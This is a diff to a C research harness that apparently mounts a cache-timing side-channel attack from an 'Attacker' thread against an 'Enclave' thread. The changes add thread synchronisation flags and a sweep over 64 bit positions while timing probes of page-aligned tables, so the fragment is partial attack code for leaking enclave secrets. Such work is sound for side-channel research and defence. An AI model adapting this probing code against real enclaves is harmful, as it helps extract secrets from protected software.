@@ -294,7 +294,7 @@ unsigned int auth() {
  * Print usage.
  */
 void usage(char **argv) {
-	printf("Usage: %s\n", argv[0]);
+	printf("Usage: %s arg_bit\n", argv[0]);
 }
 
 /*
@@ -315,6 +315,17 @@ static void enclave_thread(void) {
 
 	fprintf(stderr, "[Enclave] Enclave running on %d\n", sched_getcpu());
 	pthread_mutex_unlock(&lock);
+
+	thread_done = 1;
+
+	while(!prime_start);
+
+	// init();
+	// clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i3);
+	// auth();
+	// clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i4);
+	// printf("auth times sub: %ld\n", i4.tv_nsec - i3.tv_nsec);
+	
 }
 
 /*
@@ -349,7 +360,7 @@ static int eliminate(void) {
 	return done_ret;
 }
 
-#define TIMES 100
+#define TIMES 300
 
 void four_bit_test() {
 
@@ -387,19 +398,23 @@ void four_bit_test() {
 
 static const uint8_t faddrs[8][64][64] __attribute__ ((aligned (4096)));
 
-void one_bit_test() {
+int one_bit_test(int LEFT_ONE) {
 	int repeat = 0;
 	int table;
 	int result = 0;
 
-	uint32_t tmp_code = 0;
+	int ret = 0;
 
-	#define LEFT_ONE 13
+	uint32_t tmp_code = 0;
 
 	uint32_t count[TIMES];
 	memset(count, 0x0, 4*TIMES);
 
+	while (!thread_done);
+
 	clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &i1);
+
+	prime_start = 1;
 
 	for (;repeat < TIMES; repeat++) {
 
@@ -427,15 +442,20 @@ void one_bit_test() {
 	printf("times sub: %ld\n", i2.tv_nsec - i1.tv_nsec);
 
 	for (repeat = 0;repeat < TIMES; repeat++) {
-		if (count[repeat] > 0)
+		if (count[repeat] > 0) {
 			fprintf(stderr, "1");
-		else
+		}
+		else {
 			fprintf(stderr, "0");			
+			ret = 1;
+		}
 		
-		fprintf(stderr, "\n");
+		//fprintf(stderr, "\n");
 	}
 	
 	fprintf(stderr, "\n%d\n", tmp_code);
+
+	return ret;
 }
 
 /*
@@ -446,11 +466,15 @@ int main(int argc,char **argv) {
 	volatile int alignment_stack __attribute__ ((aligned(4096)));
 	volatile int alignment_stack_2 __attribute__ ((aligned(1024)));
 
-	if (argc != 1) {
+	int ret;
+
+	if (argc != 2) {
 		usage(argv);
 		return EXIT_FAILURE;
 	}
 	
+	long arg_bit = strtol(argv[1], NULL, 10);
+
 	// fill candidates
 	for(j=0; j < BLOCK_SIZE; j++) {
 		candidates_count[j] = 256;
@@ -486,14 +510,22 @@ int main(int argc,char **argv) {
 	fprintf(stderr, "[Attacker] Attacker running on %d\n", sched_getcpu());
 	pthread_mutex_unlock(&lock);
 
-	one_bit_test();
-
+	// one_bit_test((int)arg_bit);	
 	
-	printf("prime start, prime end, auth start, auth end: \n%ld\n%ld\n%ld\n%ld\n",
-		i1.tv_nsec, 
-		i2.tv_nsec, 
-		i3.tv_nsec,
-		i4.tv_nsec);
+	for (j = 0; j < 64; j++) {
+		ret = one_bit_test(j);
+
+		if (ret) {
+			printf("match bit: %d", ret);
+		}
+
+		int64_t min = i1.tv_nsec > i3.tv_nsec ? i3.tv_nsec : i1.tv_nsec;
+		printf("prime start, prime end, auth start, auth end: \n%ld\n%ld\n%ld\n%ld\n",
+			i1.tv_nsec - min, 
+			i2.tv_nsec - min, 
+			i3.tv_nsec - min,
+			i4.tv_nsec - min);
+	}
 
 	fprintf(stderr, "[Attacker] Stopping enclave\n");
 	// pthread_join(thread, NULL);
